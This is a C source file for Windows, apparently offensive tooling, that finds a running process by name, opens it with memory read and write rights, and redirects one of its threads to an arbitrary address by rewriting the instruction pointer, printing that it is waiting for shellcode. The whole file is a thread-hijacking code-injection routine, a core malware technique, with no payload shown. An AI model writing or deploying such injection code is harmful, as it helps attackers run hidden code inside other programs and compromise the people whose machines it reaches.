#include "hijak.h"

BOOL GetProcess(LPWSTR processName, DWORD* pid, HANDLE* hProcess) {
	PROCESSENTRY32 pe32 = { .dwSize = sizeof(PROCESSENTRY32) };
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnap == INVALID_HANDLE_VALUE) return 0;

	if (!Process32First(hSnap, &pe32)) {
		printf("Error: %d \n", GetLastError());
		CloseHandle(hSnap);
		return FALSE;
	}

	while (Process32Next(hSnap, &pe32)) {
		WCHAR name[MAX_PATH * 2];
		if (pe32.szExeFile) {
			DWORD dwSize = lstrlenW(pe32.szExeFile);
			DWORD i = 0;

			if (dwSize < MAX_PATH * 2) {
				for (; i < dwSize; i++)
					name[i] = (WCHAR)tolower(pe32.szExeFile[i]);
				name[i++] = '\0'; }

			if (wcscmp(name, processName) == 0) {
				*pid = pe32.th32ProcessID;
				*hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_SET_INFORMATION |
					PROCESS_SET_QUOTA | PROCESS_VM_OPERATION | PROCESS_VM_READ |
					PROCESS_VM_WRITE | SYNCHRONIZE , FALSE, pe32.th32ProcessID);
				if (*hProcess == NULL) {
					printf("Error: %d \n", GetLastError());
					CloseHandle(hSnap);
					return FALSE;
				}
				break;
			}
		}
	}
	CloseHandle(hSnap);
	return TRUE;
}

VOID temp(VOID) {
	printf("temp fun");
	return;
}


BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
	CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER };
	// SuspendThread(hThread);

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("Failed to retrieve thread context \n");
		return FALSE; }

	ThreadCtx.Rip = pAddress;
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("SetThreadContext Failed \n");
		return FALSE; }

	ResumeThread(hThread);
	printf("Thred resumed, waiting for shellcode \n");

	WaitForSingleObject(hThread, INFINITE);
	printf("End sium");

	CloseHandle(hThread);

	return TRUE;
}

